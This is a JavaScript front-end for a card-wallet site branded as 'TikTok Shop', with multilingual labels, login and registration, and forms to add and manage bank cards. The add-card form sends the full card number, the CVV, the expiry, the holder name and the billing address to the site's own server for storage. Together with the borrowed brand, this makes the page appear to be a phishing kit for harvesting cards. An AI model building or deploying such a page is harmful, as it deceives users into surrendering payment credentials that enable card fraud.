const LANGS={"th":"ไทย","en":"English","zh-CN":"简体中文","zh-TW":"繁體中文","ja":"日本語","ko":"한국어","vi":"Tiếng Việt","id":"Bahasa Indonesia","hi":"हिन्दी","es":"Español","de":"Deutsch","fr":"Français","it":"Italiano","pt":"Português","nl":"Nederlands","pl":"Polski","ru":"Русский"};
const TEXT={
"zh-CN":{login:"登录",register:"注册",email:"邮箱",password:"密码",cards:"银行卡",account:"账户",logout:"退出",add:"添加银行卡",manage:"管理银行卡",holder:"持卡人",bank:"银行",expiry:"有效期",address:"账单地址",network:"卡组织",save:"保存",default:"默认",setDefault:"设为默认",valid:"有效",invalid:"无效",cancel:"取消",noCards:"暂无银行卡",cardNumber:"完整卡号",cvv:"CVV / CVC",detailTitle:"银行卡详情",statusLabel:"状态"},
"zh-TW":{login:"登入",register:"註冊",email:"電子郵件",password:"密碼",cards:"銀行卡",account:"帳戶",logout:"登出",add:"新增卡片",manage:"管理卡片",holder:"持卡人",bank:"銀行",expiry:"有效期限",address:"帳單地址",network:"卡組織",save:"儲存",default:"預設",setDefault:"設為預設",valid:"有效",invalid:"無效",cancel:"取消",noCards:"尚無卡片",cardNumber:"完整卡號",cvv:"CVV / CVC",detailTitle:"銀行卡詳情",statusLabel:"狀態"},
"en":{login:"Login",register:"Register",email:"Email",password:"Password",cards:"Bank Cards",account:"Account",logout:"Log out",add:"Add Card",manage:"Manage Cards",holder:"Cardholder",bank:"Bank",expiry:"Expiry",address:"Billing address",network:"Network",save:"Save",default:"Default",setDefault:"Set default",valid:"Valid",invalid:"Invalid",cancel:"Cancel",noCards:"No cards",cardNumber:"Card number",cvv:"CVV / CVC",detailTitle:"Card Details",statusLabel:"Status"},
"th":{login:"เข้าสู่ระบบ",register:"สมัครสมาชิก",email:"อีเมล",password:"รหัสผ่าน",cards:"บัตรธนาคาร",account:"บัญชี",logout:"ออกจากระบบ",add:"เพิ่มบัตร",manage:"จัดการบัตร",holder:"ผู้ถือบัตร",bank:"ธนาคาร",expiry:"วันหมดอายุ",address:"ที่อยู่เรียกเก็บเงิน",network:"เครือข่าย",save:"บันทึก",default:"ค่าเริ่มต้น",setDefault:"ตั้งเป็นค่าเริ่มต้น",valid:"ใช้ได้",invalid:"ใช้ไม่ได้",cancel:"ยกเลิก",noCards:"ไม่มีบัตร",cardNumber:"หมายเลขบัตร",cvv:"CVV / CVC",detailTitle:"รายละเอียดบัตร",statusLabel:"สถานะ"},
"ja":{login:"ログイン",register:"登録",email:"メール",password:"パスワード",cards:"銀行カード",account:"アカウント",logout:"ログアウト",add:"カード追加",manage:"カード管理",holder:"カード名義",bank:"銀行",expiry:"有効期限",address:"請求先住所",network:"カードブランド",save:"保存",default:"デフォルト",setDefault:"デフォルトに設定",valid:"有効",invalid:"無効",cancel:"キャンセル",noCards:"カードがありません",cardNumber:"カード番号",cvv:"CVV / CVC",detailTitle:"カード詳細",statusLabel:"ステータス"},
"ko":{login:"로그인",register:"회원가입",email:"이메일",password:"비밀번호",cards:"은행 카드",account:"계정",logout:"로그아웃",add:"카드 추가",manage:"카드 관리",holder:"카드 소유자",bank:"은행",expiry:"유효기간",address:"청구지 주소",network:"카드사",save:"저장",default:"기본",setDefault:"기본으로 설정",valid:"유효",invalid:"무효",cancel:"취소",noCards:"카드 없음",cardNumber:"카드 번호",cvv:"CVV / CVC",detailTitle:"카드 상세",statusLabel:"상태"},
"vi":{login:"Đăng nhập",register:"Đăng ký",email:"Email",password:"Mật khẩu",cards:"Thẻ ngân hàng",account:"Tài khoản",logout:"Đăng xuất",add:"Thêm thẻ",manage:"Quản lý thẻ",holder:"Chủ thẻ",bank:"Ngân hàng",expiry:"Ngày hết hạn",address:"Địa chỉ thanh toán",network:"Mạng lưới",save:"Lưu",default:"Mặc định",setDefault:"Đặt mặc định",valid:"Hợp lệ",invalid:"Không hợp lệ",cancel:"Hủy",noCards:"Chưa có thẻ",cardNumber:"Số thẻ",cvv:"CVV / CVC",detailTitle:"Chi tiết thẻ",statusLabel:"Trạng thái"},
"id":{login:"Masuk",register:"Daftar",email:"Email",password:"Kata sandi",cards:"Kartu Bank",account:"Akun",logout:"Keluar",add:"Tambah Kartu",manage:"Kelola Kartu",holder:"Pemegang Kartu",bank:"Bank",expiry:"Kedaluwarsa",address:"Alamat Penagihan",network:"Jaringan",save:"Simpan",default:"Default",setDefault:"Jadikan Default",valid:"Valid",invalid:"Tidak Valid",cancel:"Batal",noCards:"Tidak ada kartu",cardNumber:"Nomor Kartu",cvv:"CVV / CVC",detailTitle:"Detail Kartu",statusLabel:"Status"},
"hi":{login:"लॉगिन",register:"पंजीकरण",email:"ईमेल",password:"पासवर्ड",cards:"बैंक कार्ड",account:"खाता",logout:"लॉगआउट",add:"कार्ड जोड़ें",manage:"कार्ड प्रबंधित करें",holder:"कार्डधारक",bank:"बैंक",expiry:"समाप्ति",address:"बिलिंग पता",network:"नेटवर्क",save:"सहेजें",default:"डिफ़ॉल्ट",setDefault:"डिफ़ॉल्ट पर सेट करें",valid:"मान्य",invalid:"अमान्य",cancel:"रद्द करें",noCards:"कोई कार्ड नहीं",cardNumber:"कार्ड नंबर",cvv:"CVV / CVC",detailTitle:"कार्ड विवरण",statusLabel:"स्थिति"},
"es":{login:"Iniciar sesión",register:"Registrarse",email:"Correo electrónico",password:"Contraseña",cards:"Tarjetas bancarias",account:"Cuenta",logout:"Cerrar sesión",add:"Añadir tarjeta",manage:"Gestionar tarjetas",holder:"Titular",bank:"Banco",expiry:"Caducidad",address:"Dirección de facturación",network:"Red",save:"Guardar",default:"Predeterminada",setDefault:"Establecer como predeterminada",valid:"Válida",invalid:"Inválida",cancel:"Cancelar",noCards:"No hay tarjetas",cardNumber:"Número de tarjeta",cvv:"CVV / CVC",detailTitle:"Detalles de la tarjeta",statusLabel:"Estado"},
"de":{login:"Anmelden",register:"Registrieren",email:"E-Mail",password:"Passwort",cards:"Bankkarten",account:"Konto",logout:"Abmelden",add:"Karte hinzufügen",manage:"Karten verwalten",holder:"Karteninhaber",bank:"Bank",expiry:"Ablaufdatum",address:"Rechnungsadresse",network:"Netzwerk",save:"Speichern",default:"Standard",setDefault:"Als Standard festlegen",valid:"Gültig",invalid:"Ungültig",cancel:"Abbrechen",noCards:"Keine Karten",cardNumber:"Kartennummer",cvv:"CVV / CVC",detailTitle:"Kartendetails",statusLabel:"Status"},
"fr":{login:"Connexion",register:"S'inscrire",email:"E-mail",password:"Mot de passe",cards:"Cartes bancaires",account:"Compte",logout:"Déconnexion",add:"Ajouter une carte",manage:"Gérer les cartes",holder:"Titulaire",bank:"Banque",expiry:"Expiration",address:"Adresse de facturation",network:"Réseau",save:"Enregistrer",default:"Par défaut",setDefault:"Définir par défaut",valid:"Valide",invalid:"Invalide",cancel:"Annuler",noCards:"Aucune carte",cardNumber:"Numéro de carte",cvv:"CVV / CVC",detailTitle:"Détails de la carte",statusLabel:"Statut"},
"it":{login:"Accedi",register:"Registrati",email:"Email",password:"Password",cards:"Carte bancarie",account:"Account",logout:"Esci",add:"Aggiungi carta",manage:"Gestisci carte",holder:"Titolare",bank:"Banca",expiry:"Scadenza",address:"Indirizzo di fatturazione",network:"Circuito",save:"Salva",default:"Predefinita",setDefault:"Imposta come predefinita",valid:"Valida",invalid:"Non valida",cancel:"Annulla",noCards:"Nessuna carta",cardNumber:"Numero carta",cvv:"CVV / CVC",detailTitle:"Dettagli carta",statusLabel:"Stato"},
"pt":{login:"Entrar",register:"Cadastrar",email:"Email",password:"Senha",cards:"Cartões bancários",account:"Conta",logout:"Sair",add:"Adicionar cartão",manage:"Gerenciar cartões",holder:"Titular",bank:"Banco",expiry:"Validade",address:"Endereço de cobrança",network:"Rede",save:"Salvar",default:"Padrão",setDefault:"Definir como padrão",valid:"Válido",invalid:"Inválido",cancel:"Cancelar",noCards:"Nenhum cartão",cardNumber:"Número do cartão",cvv:"CVV / CVC",detailTitle:"Detalhes do cartão",statusLabel:"Status"},
"nl":{login:"Inloggen",register:"Registreren",email:"E-mail",password:"Wachtwoord",cards:"Bankkaarten",account:"Account",logout:"Uitloggen",add:"Kaart toevoegen",manage:"Kaarten beheren",holder:"Kaarthouder",bank:"Bank",expiry:"Vervaldatum",address:"Factuuradres",network:"Netwerk",save:"Opslaan",default:"Standaard",setDefault:"Als standaard instellen",valid:"Geldig",invalid:"Ongeldig",cancel:"Annuleren",noCards:"Geen kaarten",cardNumber:"Kaartnummer",cvv:"CVV / CVC",detailTitle:"Kaartgegevens",statusLabel:"Status"},
"pl":{login:"Zaloguj się",register:"Zarejestruj się",email:"Email",password:"Hasło",cards:"Karty bankowe",account:"Konto",logout:"Wyloguj",add:"Dodaj kartę",manage:"Zarządzaj kartami",holder:"Właściciel karty",bank:"Bank",expiry:"Ważność",address:"Adres rozliczeniowy",network:"Sieć",save:"Zapisz",default:"Domyślna",setDefault:"Ustaw jako domyślną",valid:"Ważna",invalid:"Nieważna",cancel:"Anuluj",noCards:"Brak kart",cardNumber:"Numer karty",cvv:"CVV / CVC",detailTitle:"Szczegóły karty",statusLabel:"Status"},
"ru":{login:"Войти",register:"Регистрация",email:"Email",password:"Пароль",cards:"Банковские карты",account:"Аккаунт",logout:"Выйти",add:"Добавить карту",manage:"Управление картами",holder:"Владелец карты",bank:"Банк",expiry:"Срок действия",address:"Адрес для счетов",network:"Платёжная система",save:"Сохранить",default:"По умолчанию",setDefault:"Сделать по умолчанию",valid:"Действительна",invalid:"Недействительна",cancel:"Отмена",noCards:"Нет карт",cardNumber:"Номер карты",cvv:"CVV / CVC",detailTitle:"Детали карты",statusLabel:"Статус"}
};
let LANG=localStorage.getItem("lang")||((navigator.language||"en").toLowerCase().startsWith("zh")?"zh-CN":"en");
function tr(k){return (TEXT[LANG]||TEXT.en)[k]||TEXT.en[k]||k}
function esc(s){return String(s??"").replace(/[&<>"']/g,m=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[m]))}
function toast(s){const e=document.querySelector(".toast");if(!e)return;e.textContent=s;e.classList.add("show");setTimeout(()=>e.classList.remove("show"),1800)}
function header(){return `<header class="topbar"><div class="logo">TikTok <span>Shop</span></div><div class="lang"><select onchange="localStorage.setItem('lang',this.value);location.reload()">${Object.entries(LANGS).map(([k,v])=>`<option value="${k}" ${k===LANG?"selected":""}>${v}</option>`).join("")}</select></div></header>`}
async function api(path,opt={}){const r=await fetch(path,{credentials:"include",headers:{"Content-Type":"application/json",...(opt.headers||{})},...opt});let d={};try{d=await r.json()}catch{}if(!r.ok)throw new Error(d.error||"请求失败");return d}
function bankGradient(){return "linear-gradient(135deg,#161616,#2c2c2c)"}
async function renderAuth(){
 document.getElementById("app").innerHTML=header()+`<main class="page center"><section class="auth-card"><div class="logo">TikTok <span>Shop</span></div><div class="auth-tabs"><button id="lt" class="active">${tr("login")}</button><button id="rt">${tr("register")}</button></div><form id="authf"><div class="field"><label>${tr("email")}</label><input id="email" type="email" required></div><div class="field"><label>${tr("password")}</label><input id="pwd" type="password" minlength="6" required></div><button class="primary" id="submit">${tr("login")}</button></form></section></main>`;
 let mode="login";const lt=document.getElementById("lt"),rt=document.getElementById("rt"),sb=document.getElementById("submit");
 lt.onclick=()=>{mode="login";lt.classList.add("active");rt.classList.remove("active");sb.textContent=tr("login")};
 rt.onclick=()=>{mode="register";rt.classList.add("active");lt.classList.remove("active");sb.textContent=tr("register")};
 document.getElementById("authf").onsubmit=async e=>{e.preventDefault();try{await api("/api/auth",{method:"POST",body:JSON.stringify({action:mode,email:email.value.trim(),password:pwd.value})});location.href="./cards.html"}catch(err){toast(err.message)}};
}
async function requireMe(){try{return await api("/api/me")}catch{location.href="./index.html";throw new Error("unauthorized")}}
function cardHtml(c){return `<div class="fw-card ${c.status==="invalid"?"invalid":""}" data-card-id="${c.id}" style="background:${bankGradient()}"><div class="fw-bank">${esc(c.bank)}</div><div class="fw-network">${esc(c.network||"")}</div><div class="fw-chip"></div><div class="fw-pan">•••• &nbsp;•••• &nbsp;•••• &nbsp;${esc(c.last4)}</div><div class="fw-bottom"><div><div class="fw-holder">${esc(c.holder)}</div><div class="fw-exp">${esc(c.expiry)}</div></div>${c.is_default?`<div class="fw-badge">★ ${tr("default")}</div>`:""}</div></div>`}
async function renderWallet(){
 const me=await requireMe();const data=await api("/api/cards");const cards=data.cards||[];
 document.getElementById("app").innerHTML=header()+`<main class="final-wallet"><div class="fw-top" style="justify-content:flex-end;margin-bottom:28px"><button class="fw-profile" onclick="location.href='./account.html'">◉</button></div>${cards.length?`<div class="carousel-wrap"><div class="carousel" id="fwCarousel">${cards.map(cardHtml).join("")}</div></div><div class="fw-dots" id="fwDots">${cards.map((_,i)=>`<span class="fw-dot ${i===0?"active":""}"></span>`).join("")}</div>`:`<div class="fw-empty">${tr("noCards")}</div>`}<div class="fw-actions"><button class="fw-add" onclick="openAdd()">＋ ${tr("add")}</button><button class="fw-manage" onclick="openManage()">▤ ${tr("manage")}</button></div></main>`;
 const row=document.getElementById("fwCarousel");
 if(row){
  const dots=document.getElementById("fwDots");
  const updateActive=()=>{
   const items=[...row.children];
   if(!items.length)return;
   const center=row.scrollLeft+row.clientWidth/2;
   let idx=0,min=Infinity;
   items.forEach((el,i)=>{const c=el.offsetLeft+el.offsetWidth/2;const d=Math.abs(c-center);if(d<min){min=d;idx=i}});
   items.forEach((el,i)=>{
    el.classList.toggle("is-active",i===idx);
    el.classList.toggle("is-prev",i===idx-1);
    el.classList.toggle("is-next",i===idx+1);
   });
   if(dots)[...dots.children].forEach((d,i)=>d.classList.toggle("active",i===idx));
  };
  let raf=0;
  row.addEventListener("scroll",()=>{cancelAnimationFrame(raf);raf=requestAnimationFrame(updateActive)});
  row.addEventListener("click",e=>{
   const el=e.target.closest(".fw-card");
   if(!el)return;
   const items=[...row.children];
   const i=items.indexOf(el);
   const center=row.scrollLeft+row.clientWidth/2;
   const elCenter=el.offsetLeft+el.offsetWidth/2;
   if(Math.abs(elCenter-center)>8){
    el.scrollIntoView({behavior:"smooth",inline:"center",block:"nearest"});
    return;
   }
   openDetail(el.dataset.cardId);
  });
  updateActive();
 }
 window.__cards=cards;
}
window.openDetail=id=>{const c=(window.__cards||[]).find(x=>String(x.id)===String(id));if(!c)return;document.getElementById("detailModal").innerHTML=`<div class="sheet"><div class="modal-head"><h3>${tr("detailTitle")}</h3><button class="x" onclick="detailModal.classList.remove('show')">×</button></div><div class="detail-grid"><div class="detail"><b>${tr("bank")}</b>${esc(c.bank)}</div><div class="detail"><b>${tr("cardNumber")}</b>•••• •••• •••• ${esc(c.last4)}</div><div class="detail"><b>${tr("network")}</b>${esc(c.network||"")}</div><div class="detail"><b>${tr("holder")}</b>${esc(c.holder)}</div><div class="detail"><b>${tr("expiry")}</b>${esc(c.expiry)}</div><div class="detail"><b>${tr("address")}</b>${esc(c.address||"")}</div><div class="detail"><b>${tr("statusLabel")}</b>${c.status==="valid"?tr("valid"):tr("invalid")}</div>${c.status==="valid"&&!c.is_default?`<button class="primary" onclick="setDefault('${c.id}')">${tr("setDefault")}</button>`:""}</div></div>`;detailModal.classList.add("show")};
window.setDefault=async id=>{try{await api("/api/cards",{method:"PATCH",body:JSON.stringify({id,action:"default"})});location.reload()}catch(e){toast(e.message)}};
window.openAdd=()=>{document.getElementById("addModal").innerHTML=`<div class="sheet"><div class="modal-head"><h3>${tr("add")}</h3><button class="x" onclick="addModal.classList.remove('show')">×</button></div><form id="cardForm"><div class="field"><label>${tr("holder")}</label><input id="holder" required></div><div class="field"><label>${tr("cardNumber")}</label><input id="cardNumber" inputmode="numeric" autocomplete="cc-number" maxlength="19" required></div><div class="field"><label>${tr("expiry")}</label><input id="exp" inputmode="numeric" maxlength="5" required></div><div class="field"><label>${tr("cvv")}</label><input id="cvv" type="password" inputmode="numeric" maxlength="4" pattern="[0-9]{3,4}" required></div><div class="field"><label>${tr("network")}</label><select id="network"><option>Visa</option><option>Mastercard</option><option>UnionPay</option><option>Other</option></select></div><div class="field"><label>${tr("address")}</label><textarea id="addr"></textarea></div><button class="primary">${tr("save")}</button></form></div>`;addModal.classList.add("show");

 const cnEl=document.getElementById("cardNumber");
 const expEl=document.getElementById("exp");
 const netEl=document.getElementById("network");

 cnEl.addEventListener("input",()=>{
  let v=cnEl.value.replace(/\D/g,"").slice(0,19);
  cnEl.value=v.replace(/(.{4})/g,"$1 ").trim();
  let net="Other";
  if(/^4/.test(v))net="Visa";
  else if(/^5[1-5]/.test(v)||/^2[2-7]/.test(v))net="Mastercard";
  else if(/^62/.test(v))net="UnionPay";
  if(v.length>=2)netEl.value=net;
 });

 expEl.addEventListener("input",()=>{
  let v=expEl.value.replace(/\D/g,"").slice(0,4);
  if(v.length>=3)v=v.slice(0,2)+"/"+v.slice(2);
  expEl.value=v;
 });

 document.getElementById("cardForm").onsubmit=async e=>{
  e.preventDefault();
  try{
   const cn=cnEl.value.replace(/\D/g,"");
   await api("/api/cards",{method:"POST",body:JSON.stringify({
    holder:holder.value.trim(),
    card_number:cn,
    last4:cn.slice(-4),
    cvv:cvv.value.replace(/\D/g,""),
    expiry:expEl.value.trim(),
    bank:netEl.value,
    network:netEl.value,
    address:addr.value.trim()
   })});
   location.reload();
  }catch(err){toast(err.message)}
 };
};
window.openManage=()=>{const cs=window.__cards||[];document.getElementById("manageModal").innerHTML=`<div class="sheet"><div class="modal-head"><h3>${tr("manage")}</h3><button class="x" onclick="manageModal.classList.remove('show')">×</button></div><div class="manage-list">${cs.map(c=>`<div class="manage-row" onclick="openDetail('${c.id}')"><div class="manage-icon" style="background:${bankGradient()}">${esc((c.bank||"").slice(0,3).toUpperCase())}</div><div><div class="manage-bank">${esc(c.bank)}</div><div class="manage-meta">•••• ${esc(c.last4)} · ${esc(c.network||"")}${c.is_default?" · "+tr("default"):""}</div></div><div class="manage-arrow">›</div></div>`).join("")}</div></div>`;manageModal.classList.add("show")};
async function renderAccount(){const me=await requireMe();document.getElementById("app").innerHTML=header()+`<main class="page"><section class="panel"><h1>${tr("account")}</h1><div class="detail"><b>${tr("email")}</b>${esc(me.user.email)}</div><div style="margin-top:20px"><a class="secondary" href="./cards.html">${tr("cards")}</a> <button class="primary" id="lo">${tr("logout")}</button></div></section></main>`;document.getElementById("lo").onclick=async()=>{await api("/api/auth",{method:"POST",body:JSON.stringify({action:"logout"})});location.href="./index.html"}}